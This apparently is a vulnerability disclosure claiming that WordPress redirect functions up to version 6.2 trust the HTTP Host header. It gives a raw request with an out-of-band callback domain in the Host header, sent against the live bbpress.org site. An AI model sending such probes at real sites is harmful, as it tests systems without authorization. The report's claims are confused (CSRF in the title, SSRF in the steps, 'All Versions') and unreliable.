# WordPress <=6.2 HTTPS Redirect Server Cross Site Request Forgery

## Affected Versions

WordPress Versions <=6.2 or All Versions.
</br></br>

##Vulerable Code Location

Line 20 of the WordPress/wp-login.php file and Line 1185/1126 of the WordPress/wp-includes/pluggable.php, redirection methods such as wp_safe_redirect and wp_redirect do not filter the HOST header.
</br>
![image](https://user-images.githubusercontent.com/61698045/212012763-65e7f806-435e-4492-b041-573dc4807dcd.png)
</br>

## Reporting Vulnerability

The official demo site is the latest version 6.2-alpha-55047, as a demo.
</br></br>
1、Use Burp Suite to intercept HTTP requests: http://bbpress.org/
</br></br>
2、Send HTTP SSRF requests to bbpress.org
</br></br>
GET / HTTP/1.1
</br>
Host: sieffowm3fd4d0ky081ikmrhe8ky8n.oastify.com
</br>
DNT: 1
</br>
Upgrade-Insecure-Requests: 1
</br>
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1474.0
</br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</br>
Accept-Encoding: gzip, deflate
</br>
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
</br>
sec-ch-ua-platform: "Windows"
</br>
sec-ch-ua: "Edge";v="109", "Chromium";v="109", "Not=A?Brand";v="24"
</br>
sec-ch-ua-mobile: ?0
</br>
Connection: close
</br>
</br></br>

![image](https://user-images.githubusercontent.com/61698045/212013319-13d447ef-ea25-470a-a837-e39f54a7b5ee.png)
</br>
![image](https://user-images.githubusercontent.com/61698045/212013479-09508854-414f-4069-8dda-ad77b9deabb9.png)
</br>
